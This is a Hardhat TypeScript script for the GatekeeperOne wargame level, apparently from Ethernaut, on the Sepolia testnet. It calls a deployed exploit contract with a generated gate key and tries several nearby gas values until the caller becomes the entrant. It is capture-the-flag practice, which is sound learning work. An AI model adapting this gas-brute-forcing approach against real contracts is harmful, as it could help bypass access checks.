import { ethers } from "hardhat";

/**
 * Direct exploit of the GatekeeperOne contract using a specific gas value
 * Use this when you have a gas value that you know might work
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=81910 npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No GatekeeperOneExploit contract address provided.");
    console.error("Please provide the address of your deployed GatekeeperOneExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=81910 npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia");
    return;
  }
  
  // Check if SPECIFIC_GAS was provided
  if (!process.env.SPECIFIC_GAS) {
    console.error("Error: No specific gas value provided.");
    console.error("Please provide a specific gas value using the SPECIFIC_GAS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=81910 npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia");
    return;
  }
  
  const exploitAddress = process.env.EXPLOIT_ADDRESS;
  const specificGas = parseInt(process.env.SPECIFIC_GAS);
  
  if (isNaN(specificGas) || specificGas <= 0) {
    console.error("Error: Invalid gas value. Please provide a positive integer.");
    return;
  }

  console.log(`Using GatekeeperOneExploit contract address: ${exploitAddress}`);
  console.log(`Using specific gas value: ${specificGas}`);
  
  // Get the contract factory for GatekeeperOneExploit
  const GatekeeperOneExploit = await ethers.getContractFactory("GatekeeperOneExploit");
  
  // Connect to the deployed contract
  const gatekeeperOneExploit = GatekeeperOneExploit.attach(exploitAddress);
  
  // Get the target contract address
  const targetAddress = await gatekeeperOneExploit.getFunction("gatekeeperAddress")();
  console.log(`Target GatekeeperOne contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if we already passed the gate
    console.log("Checking if we've already passed the gates...");
    const initialSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (initialSuccess) {
      console.log("Gates were already successfully passed! No need to proceed further.");
      return;
    }
    
    // Generate the gate key for the current tx.origin
    const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
    console.log(`Generated gate key: ${gateKey}`);
    console.log(`Last 2 bytes of your address: 0x${deployer.address.slice(-4)}`);
    
    // Try entering with the specific gas value
    console.log(`\nAttempting to enter with specific gas value: ${specificGas}...`);
    
    // Also trying a few values very close to the specified gas
    const gasValues = [
      specificGas, 
      specificGas - 1, 
      specificGas + 1, 
      specificGas - 2, 
      specificGas + 2
    ];
    
    let success = false;
    let workingGas = 0;
    
    for (const gasToTry of gasValues) {
      console.log(`\nTrying gas value: ${gasToTry}...`);
      
      try {
        // Use the enterGate function with this specific gas value
        const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(gasToTry);
        console.log(`Transaction sent: ${enterGateTx.hash}`);
        
        // Wait for the transaction to be mined
        console.log(`Waiting for transaction to be mined...`);
        const receipt = await enterGateTx.wait();
        console.log(`Transaction mined in block ${receipt.blockNumber}`);
        
        // Check if we succeeded
        const txSuccess = await gatekeeperOneExploit.getFunction("success")();
        console.log(`Success check returned: ${txSuccess}`);
        
        // Double-check by directly checking if we're the entrant
        const isEntrant = await gatekeeperOneExploit.getFunction("checkSuccess")();
        console.log(`Direct entrant check returned: ${isEntrant}`);
        
        if (txSuccess || isEntrant) {
          success = true;
          workingGas = gasToTry;
          console.log(`✅ Gas value ${workingGas} worked!`);
          break;
        } else {
          console.log(`❌ Gas value ${gasToTry} failed`);
        }
      } catch (error: any) {
        console.log(`❌ Gas ${gasToTry} failed with error: ${error.message ? error.message.slice(0, 100) : 'unknown error'}`);
        // Continue with next value
      }
    }
    
    // Final check
    const finalSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (finalSuccess) {
      console.log("\n🎉 EXPLOIT SUCCESSFUL! You've passed all gates and become the entrant!");
      console.log(`Working gas value: ${workingGas}`);
      
      // Try to read and log the actual entrant from the target contract directly
      try {
        const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
        const gatekeeperOne = GatekeeperOne.attach(targetAddress);
        const entrant = await gatekeeperOne.getFunction("entrant")();
        console.log(`Verified entrant in target contract: ${entrant}`);
        console.log(`Your address (tx.origin): ${deployer.address}`);
        console.log(`Match: ${entrant.toLowerCase() === deployer.address.toLowerCase()}`);
      } catch (error) {
        console.log(`Could not directly verify entrant in target contract`);
      }
    } else {
      console.log("\n❌ EXPLOIT FAILED. Could not pass all gates.");
      console.log("\nTry these approaches:");
      console.log("1. Try with a different specific gas value");
      console.log("   - Common working values: 24527, 24789, 81910, 81911");
      console.log("2. Try the value with a specific offset: 81910+254");
      console.log("3. Use the calibrate-gas.ts script to analyze more options");
      console.log("4. Try on a local hardhat network which may be more predictable");
    }
  } catch (error: any) {
    console.error("\nError executing exploit:");
    console.error(error.message ? error.message : error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
